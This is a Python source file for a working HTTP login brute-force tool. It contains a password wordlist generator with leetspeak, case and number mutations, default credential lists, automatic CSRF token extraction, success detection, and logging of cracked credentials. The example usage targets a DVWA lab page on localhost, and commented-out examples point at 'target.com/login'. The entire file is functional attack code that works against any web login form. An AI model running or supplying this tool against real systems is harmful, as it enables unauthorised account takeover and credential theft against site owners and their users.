import os
import csv
import json
import time
import string
import itertools
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, Generator, Iterator, List, Optional, Set, Union

try:
    import requests
except ImportError:
    requests = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None


# ============================================================================
# Character Sets
# ============================================================================

CHARSET_DIGITS = string.digits  # 0-9
CHARSET_LOWERCASE = string.ascii_lowercase  # a-z
CHARSET_UPPERCASE = string.ascii_uppercase  # A-Z
CHARSET_LETTERS = string.ascii_letters  # a-zA-Z
CHARSET_ALPHANUMERIC = string.ascii_letters + string.digits
CHARSET_SPECIAL = "!@#$%^&*()_+-=[]{}|;':\",./<>?"
CHARSET_ALL = CHARSET_ALPHANUMERIC + CHARSET_SPECIAL

# Predefined charsets for common patterns
CHARSETS = {
    "digits": CHARSET_DIGITS,
    "lower": CHARSET_LOWERCASE,
    "upper": CHARSET_UPPERCASE,
    "letters": CHARSET_LETTERS,
    "alphanumeric": CHARSET_ALPHANUMERIC,
    "special": CHARSET_SPECIAL,
    "all": CHARSET_ALL,
}


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class AttemptLog:
    """Log entry for a single brute force attempt."""
    timestamp: str
    username: str
    password: str
    status_code: int
    response_time_ms: float
    content_length: int
    success: bool
    error: Optional[str] = None


@dataclass
class BruteForceResult:
    """Result object containing brute force execution details."""
    command: List[str]
    returncode: int
    stdout: str
    stderr: str
    credentials_found: List[Dict[str, str]]
    stats: Dict[str, Any] = field(default_factory=dict)
    logs: List[AttemptLog] = field(default_factory=list)


# ============================================================================
# Wordlist Generator
# ============================================================================

class WordlistGenerator:
    """
    Advanced wordlist generator with mutations, charsets, and combinations.
    
    Features:
    - Load from file
    - Generate from charset with length range
    - Apply prefix/suffix
    - Case mutations (upper, lower, capitalize, toggle)
    - Leetspeak substitutions
    - Number appending (years, common sequences)
    - Custom transformations
    """
    
    # Leetspeak substitution map
    LEET_MAP = {
        'a': ['4', '@'],
        'e': ['3'],
        'i': ['1', '!'],
        'o': ['0'],
        's': ['5', '$'],
        't': ['7'],
        'l': ['1'],
        'b': ['8'],
        'g': ['9'],
    }
    
    # Common number sequences to append
    COMMON_NUMBERS = [
        "1", "12", "123", "1234", "12345", "123456",
        "0", "00", "01", "007", "69", "77", "99",
        "2020", "2021", "2022", "2023", "2024", "2025", "2026",
        "!", "!!", "!!!", "@", "#", "$",
    ]
    
    def __init__(self):
        self.words: List[str] = []
        self.prefix: str = ""
        self.suffix: str = ""
        self.transformations: List[Callable[[str], List[str]]] = []
    
    def load_file(self, filepath: str, encoding: str = "utf-8") -> "WordlistGenerator":
        """Load words from a file."""
        if os.path.exists(filepath):
            with open(filepath, "r", encoding=encoding, errors="ignore") as f:
                for line in f:
                    word = line.strip()
                    if word and not word.startswith("#"):
                        self.words.append(word)
        return self
    
    def add_words(self, words: List[str]) -> "WordlistGenerator":
        """Add words directly."""
        self.words.extend(words)
        return self
    
    def set_prefix(self, prefix: str) -> "WordlistGenerator":
        """Set prefix for all generated words."""
        self.prefix = prefix
        return self
    
    def set_suffix(self, suffix: str) -> "WordlistGenerator":
        """Set suffix for all generated words."""
        self.suffix = suffix
        return self
    
    def generate_charset(
        self, 
        charset: str = "alphanumeric",
        min_length: int = 1,
        max_length: int = 4,
        limit: Optional[int] = None
    ) -> "WordlistGenerator":
        """
        Generate words from a character set.
        
        Args:
            charset: Name of charset or custom string of characters
            min_length: Minimum word length
            max_length: Maximum word length
            limit: Maximum number of words to generate (None for all)
        """
        chars = CHARSETS.get(charset, charset)
        count = 0
        
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(chars, repeat=length):
                if limit and count >= limit:
                    return self
                self.words.append("".join(combo))
                count += 1
        
        return self
    
    def add_case_mutations(self) -> "WordlistGenerator":
        """Add case mutation transformation."""
        def case_mutate(word: str) -> List[str]:
            return [
                word.lower(),
                word.upper(),
                word.capitalize(),
                word.swapcase(),
                word.title(),
            ]
        self.transformations.append(case_mutate)
        return self
    
    def add_leet_mutations(self, max_substitutions: int = 2) -> "WordlistGenerator":
        """Add leetspeak mutation transformation."""
        def leet_mutate(word: str) -> List[str]:
            results = [word]
            word_lower = word.lower()
            
            # Find positions that can be substituted
            positions = []
            for i, char in enumerate(word_lower):
                if char in self.LEET_MAP:
                    positions.append((i, char))
            
            # Generate combinations of substitutions
            for r in range(1, min(max_substitutions + 1, len(positions) + 1)):
                for combo in itertools.combinations(range(len(positions)), r):
                    # Get all possible substitutions for selected positions
                    sub_options = []
                    for idx in combo:
                        pos, char = positions[idx]
                        sub_options.append([(pos, sub) for sub in self.LEET_MAP[char]])
                    
                    # Generate all combinations
                    for subs in itertools.product(*sub_options):
                        new_word = list(word)
                        for pos, sub in subs:
                            new_word[pos] = sub
                        results.append("".join(new_word))
            
            return results
        
        self.transformations.append(leet_mutate)
        return self
    
    def add_number_suffix(self, numbers: Optional[List[str]] = None) -> "WordlistGenerator":
        """Add common numbers as suffix."""
        nums = numbers or self.COMMON_NUMBERS
        
        def number_suffix(word: str) -> List[str]:
            return [word] + [word + n for n in nums]
        
        self.transformations.append(number_suffix)
        return self
    
    def add_custom_transform(self, func: Callable[[str], List[str]]) -> "WordlistGenerator":
        """Add a custom transformation function."""
        self.transformations.append(func)
        return self
    
    def generate(self) -> Generator[str, None, None]:
        """Generate all words with transformations applied."""
        seen: Set[str] = set()
        
        for word in self.words:
            # Apply all transformations
            current = [word]
            for transform in self.transformations:
                next_words = []
                for w in current:
                    next_words.extend(transform(w))
                current = next_words
            
            # Apply prefix/suffix and yield unique words
            for w in current:
                final = f"{self.prefix}{w}{self.suffix}"
                if final not in seen:
                    seen.add(final)
                    yield final
    
    def to_list(self, limit: Optional[int] = None) -> List[str]:
        """Convert generator to list with optional limit."""
        result = []
        for i, word in enumerate(self.generate()):
            if limit and i >= limit:
                break
            result.append(word)
        return result


# ============================================================================
# Logger
# ============================================================================

class BruteForceLogger:
    """
    Advanced logger for brute force attacks.
    
    Features:
    - Console output with verbosity levels
    - JSON log file
    - CSV log file
    - Real-time statistics
    """
    
    VERBOSITY_QUIET = 0    # Only show found credentials
    VERBOSITY_NORMAL = 1   # Show progress and found credentials
    VERBOSITY_VERBOSE = 2  # Show all attempts
    VERBOSITY_DEBUG = 3    # Show everything including headers/responses
    
    def __init__(
        self,
        verbosity: int = VERBOSITY_NORMAL,
        log_file: Optional[str] = None,
        log_format: str = "json",  # "json" or "csv"
        show_progress: bool = True,
        progress_interval: int = 10,  # Show progress every N attempts
    ):
        self.verbosity = verbosity
        self.log_file = log_file
        self.log_format = log_format
        self.show_progress = show_progress
        self.progress_interval = progress_interval
        
        self.logs: List[AttemptLog] = []
        self.start_time: Optional[float] = None
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.error_attempts = 0
        
        # CSV writer setup
        self._csv_file = None
        self._csv_writer = None
        
        if log_file and log_format == "csv":
            self._csv_file = open(log_file, "w", newline="", encoding="utf-8")
            self._csv_writer = csv.writer(self._csv_file)
            self._csv_writer.writerow([
                "timestamp", "username", "password", "status_code",
                "response_time_ms", "content_length", "success", "error"
            ])
    
    def start(self, total_combinations: int):
        """Start logging session."""
        self.start_time = time.time()
        self.total_combinations = total_combinations
        if self.verbosity >= self.VERBOSITY_NORMAL:
            print(f"[*] Starting brute force attack ({total_combinations} combinations)")
    
    def log_attempt(self, attempt: AttemptLog):
        """Log a single attempt."""
        self.logs.append(attempt)
        self.total_attempts += 1
        
        if attempt.error:
            self.error_attempts += 1
        elif attempt.success:
            self.successful_attempts += 1
        else:
            self.failed_attempts += 1
        
        # Console output based on verbosity
        if attempt.success and self.verbosity >= self.VERBOSITY_QUIET:
            print(f"[+] FOUND: {attempt.username}:{attempt.password} "
                  f"(HTTP {attempt.status_code}, {attempt.response_time_ms:.0f}ms)")
        elif attempt.error and self.verbosity >= self.VERBOSITY_VERBOSE:
            print(f"[!] ERROR: {attempt.username}:{attempt.password} - {attempt.error}")
        elif self.verbosity >= self.VERBOSITY_VERBOSE:
            print(f"[-] Failed: {attempt.username}:{attempt.password} "
                  f"(HTTP {attempt.status_code}, {attempt.response_time_ms:.0f}ms)")
        
        # Progress update
        if (self.show_progress and 
            self.verbosity >= self.VERBOSITY_NORMAL and
            self.total_attempts % self.progress_interval == 0):
            elapsed = time.time() - self.start_time
            rate = self.total_attempts / elapsed if elapsed > 0 else 0
            remaining = self.total_combinations - self.total_attempts
            eta = remaining / rate if rate > 0 else 0
            print(f"[*] Progress: {self.total_attempts}/{self.total_combinations} "
                  f"({rate:.1f}/s, ETA: {eta:.0f}s)")
        
        # Write to CSV if enabled
        if self._csv_writer:
            self._csv_writer.writerow([
                attempt.timestamp,
                attempt.username,
                attempt.password,
                attempt.status_code,
                f"{attempt.response_time_ms:.2f}",
                attempt.content_length,
                attempt.success,
                attempt.error or "",
            ])
            self._csv_file.flush()
    
    def finish(self) -> Dict[str, Any]:
        """Finish logging and return statistics."""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        stats = {
            "total_attempts": self.total_attempts,
            "successful": self.successful_attempts,
            "failed": self.failed_attempts,
            "errors": self.error_attempts,
            "duration_seconds": round(elapsed, 2),
            "rate_per_second": round(self.total_attempts / elapsed, 2) if elapsed > 0 else 0,
            "start_time": datetime.fromtimestamp(self.start_time).isoformat() if self.start_time else None,
            "end_time": datetime.now().isoformat(),
        }
        
        if self.verbosity >= self.VERBOSITY_NORMAL:
            print(f"\n[*] Finished: {self.total_attempts} attempts in {elapsed:.1f}s "
                  f"({stats['rate_per_second']}/s)")
            print(f"[*] Results: {self.successful_attempts} found, "
                  f"{self.failed_attempts} failed, {self.error_attempts} errors")
        
        # Write JSON log if enabled
        if self.log_file and self.log_format == "json":
            log_data = {
                "stats": stats,
                "attempts": [
                    {
                        "timestamp": log.timestamp,
                        "username": log.username,
                        "password": log.password,
                        "status_code": log.status_code,
                        "response_time_ms": log.response_time_ms,
                        "content_length": log.content_length,
                        "success": log.success,
                        "error": log.error,
                    }
                    for log in self.logs
                ],
            }
            with open(self.log_file, "w", encoding="utf-8") as f:
                json.dump(log_data, f, indent=2)
        
        # Close CSV file
        if self._csv_file:
            self._csv_file.close()
        
        return stats


# ============================================================================
# Request Parser
# ============================================================================

def _parse_request_file(request_file: str) -> Dict[str, Any]:
    """Parse an HTTP request file into components."""
    with open(request_file, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    
    lines = content.split("\n")
    if not lines:
        raise ValueError("Empty request file")
    
    # Parse request line
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    method = parts[0] if parts else "GET"
    path = parts[1] if len(parts) > 1 else "/"
    
    # Parse headers
    headers = {}
    body_start = 0
    for i, line in enumerate(lines[1:], 1):
        line = line.strip()
        if not line:
            body_start = i + 1
            break
        if ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
    
    # Parse body
    data = "\n".join(lines[body_start:]).strip() if body_start < len(lines) else ""
    host = headers.get("Host", "localhost")
    
    return {
        "method": method,
        "path": path,
        "headers": headers,
        "data": data,
        "host": host,
    }


# ============================================================================
# Main Brute Force Function
# ============================================================================

def run_bruteforce(
    *,
    url: Optional[str] = None,
    request_file: Optional[str] = None,
    # Wordlist options
    usernames: Optional[List[str]] = None,
    passwords: Optional[List[str]] = None,
    username_file: Optional[str] = None,
    password_file: Optional[str] = None,
    username_generator: Optional[WordlistGenerator] = None,
    password_generator: Optional[WordlistGenerator] = None,
    # Prefix/suffix
    username_prefix: str = "",
    username_suffix: str = "",
    password_prefix: str = "",
    password_suffix: str = "",
    # Request options
    username_param: str = "username",
    password_param: str = "password",
    method: Optional[str] = None,
    data: Optional[str] = None,
    cookie: Optional[str] = None,
    headers: Optional[Dict[str, str]] = None,
    # Detection options
    success_indicator: Optional[str] = None,
    failure_indicator: Optional[str] = None,
    success_codes: Optional[List[int]] = None,
    failure_codes: Optional[List[int]] = None,
    # Behavior options
    stop_on_success: bool = True,
    timeout: int = 10,
    delay: float = 0,
    max_runtime_seconds: int = 600,
    # Logging options
    verbosity: int = BruteForceLogger.VERBOSITY_NORMAL,
    log_file: Optional[str] = None,
    log_format: str = "json",
    progress_interval: int = 10,
) -> BruteForceResult:
    """
    Run HTTP brute force attack with advanced options.
    
    Args:
        url: Target URL (use this OR request_file, not both)
        request_file: Path to HTTP request file (use this OR url, not both)
        
        usernames: List of usernames to try
        passwords: List of passwords to try
        username_file: Path to username wordlist file
        password_file: Path to password wordlist file
        username_generator: WordlistGenerator for usernames
        password_generator: WordlistGenerator for passwords
        
        username_prefix: Prefix for all usernames
        username_suffix: Suffix for all usernames
        password_prefix: Prefix for all passwords
        password_suffix: Suffix for all passwords
        
        username_param: Parameter name for username (default: username)
        password_param: Parameter name for password (default: password)
        method: HTTP method (GET or POST). Auto-detected from request_file
        data: POST data template ({username} and {password} placeholders)
        cookie: Cookie header value
        headers: Additional HTTP headers
        
        success_indicator: String indicating successful login
        failure_indicator: String indicating failed login
        success_codes: HTTP status codes indicating success
        failure_codes: HTTP status codes indicating failure
        
        stop_on_success: Stop after finding first valid credential
        timeout: Request timeout in seconds
        delay: Delay between requests in seconds
        max_runtime_seconds: Overall timeout
        
        verbosity: Logging verbosity (0=quiet, 1=normal, 2=verbose, 3=debug)
        log_file: Path to log file
        log_format: Log format ("json" or "csv")
        progress_interval: Show progress every N attempts
        
    Returns:
        BruteForceResult with credentials found, stats, and logs
    """
    if requests is None:
        raise ImportError("requests library required. Install with: pip install requests")
    
    # Require exactly one target mode
    if (url is None) == (request_file is None):
        raise ValueError("Provide exactly one of: url or request_file")
    
    # Parse request file if provided
    req_data = {}
    if request_file is not None:
        if not os.path.exists(request_file):
            raise FileNotFoundError(f"Request file not found: {request_file}")
        req_data = _parse_request_file(request_file)
        
        host = req_data["host"]
        path = req_data["path"]
        scheme = "https" if "443" in host else "http"
        url = f"{scheme}://{host}{path}"
        
        if method is None:
            method = req_data["method"]
        
        if headers is None:
            headers = {}
        for k, v in req_data["headers"].items():
            if k.lower() not in ["host", "content-length"]:
                headers.setdefault(k, v)
        
        if data is None and req_data["data"]:
            data = req_data["data"]
    
    if method is None:
        method = "GET"
    
    # Build user list
    user_list = []
    if username_generator:
        user_list = username_generator.to_list()
    elif username_file and os.path.exists(username_file):
        with open(username_file, "r", encoding="utf-8", errors="ignore") as f:
            user_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    elif usernames:
        user_list = list(usernames)
    else:
        user_list = ["admin", "user", "root", "administrator", "guest", "test"]
    
    # Apply username prefix/suffix
    if username_prefix or username_suffix:
        user_list = [f"{username_prefix}{u}{username_suffix}" for u in user_list]
    
    # Build password list
    pass_list = []
    if password_generator:
        pass_list = password_generator.to_list()
    elif password_file and os.path.exists(password_file):
        with open(password_file, "r", encoding="utf-8", errors="ignore") as f:
            pass_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    elif passwords:
        pass_list = list(passwords)
    else:
        pass_list = ["password", "123456", "admin", "letmein", "welcome", "password1"]
    
    # Apply password prefix/suffix
    if password_prefix or password_suffix:
        pass_list = [f"{password_prefix}{p}{password_suffix}" for p in pass_list]
    
    # Setup session
    session = requests.Session()
    
    req_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    if headers:
        req_headers.update(headers)
    if cookie:
        req_headers["Cookie"] = cookie
    
    session.headers.update(req_headers)
    
    # Setup logger
    logger = BruteForceLogger(
        verbosity=verbosity,
        log_file=log_file,
        log_format=log_format,
        progress_interval=progress_interval,
    )
    
    total_combinations = len(user_list) * len(pass_list)
    logger.start(total_combinations)
    
    credentials_found = []
    cmd_desc = f"Brute force: {method} {url} ({total_combinations} combinations)"
    
    start_time = time.time()
    
    for username in user_list:
        for password in pass_list:
            # Check timeout
            if time.time() - start_time > max_runtime_seconds:
                break
            
            # Delay between requests
            if delay > 0:
                time.sleep(delay)
            
            # Build parameters
            params = {
                username_param: username,
                password_param: password,
            }
            
            # Handle CSRF token extraction
            if BeautifulSoup:
                try:
                    page = session.get(url, timeout=timeout)
                    soup = BeautifulSoup(page.text, "html.parser")
                    for token_name in ["user_token", "csrf_token", "csrfmiddlewaretoken", "_token", "token"]:
                        token_input = soup.find("input", {"name": token_name})
                        if token_input and token_input.get("value"):
                            params[token_name] = token_input.get("value")
                            break
                except Exception:
                    pass
            
            # Make request
            attempt_start = time.time()
            timestamp = datetime.now().isoformat()
            
            try:
                if method.upper() == "GET":
                    response = session.get(url, params=params, timeout=timeout, allow_redirects=True)
                else:
                    if data:
                        post_data = data.replace("{username}", username).replace("{password}", password)
                        response = session.post(url, data=post_data, timeout=timeout, allow_redirects=True)
                    else:
                        response = session.post(url, data=params, timeout=timeout, allow_redirects=True)
                
                response_time = (time.time() - attempt_start) * 1000
                
                # Determine success
                is_success = False
                
                # Check status codes first
                if success_codes and response.status_code in success_codes:
                    is_success = True
                elif failure_codes and response.status_code in failure_codes:
                    is_success = False
                elif success_indicator:
                    is_success = success_indicator.lower() in response.text.lower()
                elif failure_indicator:
                    is_success = failure_indicator.lower() not in response.text.lower()
                else:
                    # Default detection
                    failure_texts = [
                        "incorrect", "invalid", "wrong", "failed", 
                        "error", "denied", "unauthorized", "bad password",
                        "login failed", "authentication failed"
                    ]
                    success_texts = [
                        "welcome", "dashboard", "logout", "my account",
                        "successfully logged", "login successful"
                    ]
                    
                    has_failure = any(ft in response.text.lower() for ft in failure_texts)
                    has_success = any(st in response.text.lower() for st in success_texts)
                    
                    is_success = has_success and not has_failure
                
                # Log attempt
                attempt = AttemptLog(
                    timestamp=timestamp,
                    username=username,
                    password=password,
                    status_code=response.status_code,
                    response_time_ms=response_time,
                    content_length=len(response.content),
                    success=is_success,
                )
                logger.log_attempt(attempt)
                
                if is_success:
                    credentials_found.append({
                        "username": username,
                        "password": password
                    })
                    
                    if stop_on_success:
                        stats = logger.finish()
                        return BruteForceResult(
                            command=[cmd_desc],
                            returncode=0,
                            stdout=f"Found {len(credentials_found)} valid credential(s)",
                            stderr="",
                            credentials_found=credentials_found,
                            stats=stats,
                            logs=logger.logs,
                        )
                
            except requests.RequestException as e:
                response_time = (time.time() - attempt_start) * 1000
                attempt = AttemptLog(
                    timestamp=timestamp,
                    username=username,
                    password=password,
                    status_code=0,
                    response_time_ms=response_time,
                    content_length=0,
                    success=False,
                    error=str(e),
                )
                logger.log_attempt(attempt)
    
    stats = logger.finish()
    
    return BruteForceResult(
        command=[cmd_desc],
        returncode=0 if credentials_found else 1,
        stdout=f"Tested {logger.total_attempts} combinations, found {len(credentials_found)} valid credential(s)",
        stderr="",
        credentials_found=credentials_found,
        stats=stats,
        logs=logger.logs,
    )


def scan_login(
    *,
    url: Optional[str] = None,
    request_file: Optional[str] = None,
    cookie: Optional[str] = None,
    username_param: str = "username",
    password_param: str = "password",
    usernames: Optional[List[str]] = None,
    passwords: Optional[List[str]] = None,
    username_file: Optional[str] = None,
    password_file: Optional[str] = None,
    success_indicator: Optional[str] = None,
    failure_indicator: Optional[str] = None,
    max_runtime_seconds: int = 600,
) -> BruteForceResult:
    """
    High-level function to scan for weak credentials.
    Convenience wrapper around run_bruteforce with common options.
    """
    return run_bruteforce(
        url=url,
        request_file=request_file,
        usernames=usernames,
        passwords=passwords,
        username_file=username_file,
        password_file=password_file,
        username_param=username_param,
        password_param=password_param,
        cookie=cookie,
        success_indicator=success_indicator,
        failure_indicator=failure_indicator,
        max_runtime_seconds=max_runtime_seconds,
    )


# ============================================================================
# Example Usage
# ============================================================================

if __name__ == "__main__":
    # Example 1: Basic usage with wordlists
    print("=== Example 1: Basic brute force ===")
    res = run_bruteforce(
        url="http://localhost/vulnerabilities/brute/",
        cookie="PHPSESSID=73oi788uil43rbj3tc7a5o0mt6; security=low",
        username_param="username",
        password_param="password",
        usernames=["admin", "user"],
        passwords=["password", "admin", "123456"],
        method="GET",
        verbosity=1,
    )
    print(f"Found: {res.credentials_found}")
    print(f"Stats: {res.stats}")
    
    # Example 2: Using WordlistGenerator with mutations
    # print("\n=== Example 2: With password mutations ===")
    # pw_gen = (WordlistGenerator()
    #     .add_words(["password", "admin", "letmein"])
    #     .add_case_mutations()
    #     .add_number_suffix(["1", "123", "!"]))
    # 
    # res = run_bruteforce(
    #     url="http://target.com/login",
    #     usernames=["admin"],
    #     password_generator=pw_gen,
    #     log_file="bruteforce.json",
    #     verbosity=2,
    # )
    
    # Example 3: Generate passwords from charset
    # print("\n=== Example 3: Charset generation ===")
    # pw_gen = (WordlistGenerator()
    #     .generate_charset("digits", min_length=4, max_length=4, limit=100))
    # 
    # res = run_bruteforce(
    #     url="http://target.com/login",
    #     usernames=["admin"],
    #     password_generator=pw_gen,
    #     password_prefix="pin_",  # Generates: pin_0000, pin_0001, ...
    # )
